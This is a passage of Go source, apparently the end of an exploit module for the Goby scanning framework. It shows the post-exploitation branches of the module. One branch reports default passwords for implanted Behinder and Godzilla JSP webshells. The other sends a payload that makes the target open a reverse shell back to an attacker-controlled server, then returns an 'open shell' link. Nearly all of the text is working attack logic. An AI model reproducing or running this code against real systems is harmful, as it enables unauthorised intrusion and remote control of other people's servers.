						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					if webshell != "custom" {
						expResult.Output += "Webshell type: jsp"
					}
					return expResult
				}
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd := fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				_, err = sendPayloadFlag4EisQu(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
